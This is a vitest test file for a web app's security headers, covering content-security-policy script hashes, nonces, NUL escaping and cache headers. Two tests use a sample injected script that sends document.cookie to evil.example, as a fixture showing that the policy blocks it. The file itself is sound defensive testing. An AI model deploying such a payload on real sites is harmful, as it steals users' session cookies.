import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { contentSecurityPolicy, documentPolicy, escapeScriptNuls, inlineScriptHashes, pageCacheControl, securityHeaders } from '@lib/securityHeaders';
import { THEME_BOOT_SCRIPT } from '@lib/theme';

const hashOf = (text: string) => `'sha256-${createHash('sha256').update(text).digest('base64')}'`;

describe('content security policy', () => {
    it('writes NULs in inline scripts as escapes, so every browser hashes the same text and the data stays the same', () => {
        const nonce = 'n0nce';
        const script = 'self.match={i:"__root__\0",u:1}';
        const html = escapeScriptNuls(`<p>a\0b</p><script nonce="${nonce}">${script}</script>`);
        expect(html).toBe(`<p>a\0b</p><script nonce="${nonce}">self.match={i:"__root__\\u0000",u:1}</script>`);
        const escaped = 'self.match={i:"__root__\\u0000",u:1}';
        expect(inlineScriptHashes(html, nonce)).toEqual([hashOf(escaped)]);
        // The escape reads back as the same NUL.
        expect(new Function(`const self={};${escaped};return self.match.i`)()).toBe('__root__\0');
        expect(escapeScriptNuls('<script>plain</script>')).toBe('<script>plain</script>');
    });

    it('allows the known inline scripts by hash and nothing injected', () => {
        const injected = 'fetch("https://evil.example/?c="+document.cookie)';
        const html = `<script>${THEME_BOOT_SCRIPT}</script><script>${injected}</script><script type="application/ld+json">{"a":1}</script><script src="/assets/app.js"></script>`;
        expect(inlineScriptHashes(html)).toEqual([hashOf(THEME_BOOT_SCRIPT)]);
        const policy = contentSecurityPolicy('https://api.example.org/v1', html);
        expect(policy).toContain(`script-src 'self' ${hashOf(THEME_BOOT_SCRIPT)}`);
        expect(policy).not.toContain(hashOf(injected));
        // Inline scripts only by hash; only style attributes may be inline.
        expect(policy.split('; ').find((directive) => directive.startsWith('script-src'))).not.toContain('unsafe-inline');
        expect(policy).toContain("connect-src 'self' https://api.example.org");
        expect(policy).toContain("frame-ancestors 'none'");
    });

    it('allows the router scripts by the nonce of the response, and nothing shaped like them without it', () => {
        const bootstrap = '(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={h(){this.hydrated=!0},buffer:[]}';
        const router = '$_TSR.router=($R=>$R[0]={manifest:{}})($R["tsr"])';
        const removing = '$_TSR.e();{let s=document.currentScript,p;s.remove()}';
        const nonce = 'r4nd0m+N0nce/value==';
        const html = [bootstrap, router, removing].map((script) => `<script nonce="${nonce}" data-tsr-stream-part="">${script}</script>`).join('');
        expect(inlineScriptHashes(html, nonce)).toEqual([hashOf(bootstrap), hashOf(router), hashOf(removing)]);
        // An injection that looks like the router's data, without the nonce or with a guessed one.
        const injected = '$_TSR.x;fetch("https://evil.example/?c="+document.cookie)';
        expect(inlineScriptHashes(`<script>${injected}</script><script nonce="guess">${injected}</script>`, nonce)).toEqual([]);
        // The policy itself names hashes only: the nonce is never sent in a header.
        expect(contentSecurityPolicy('https://api.example.org', html, nonce)).not.toContain(nonce);
    });

    it('is left to the dev server, whose hot reload needs inline modules', () => {
        expect(documentPolicy('http://localhost:4000', '', false)).toBeUndefined();
        expect(documentPolicy('http://localhost:4000', '', true)).toContain("default-src 'self'");
    });

    it('sends the hardening headers on every response', () => {
        expect(securityHeaders()).toMatchObject({ 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff' });
    });

    it('lets a CDN keep a page for a minute, and never an error', () => {
        expect(pageCacheControl(200)).toContain('s-maxage=60');
        expect(pageCacheControl(404)).toBe('no-store');
        expect(pageCacheControl(500)).toBe('no-store');
    });
});
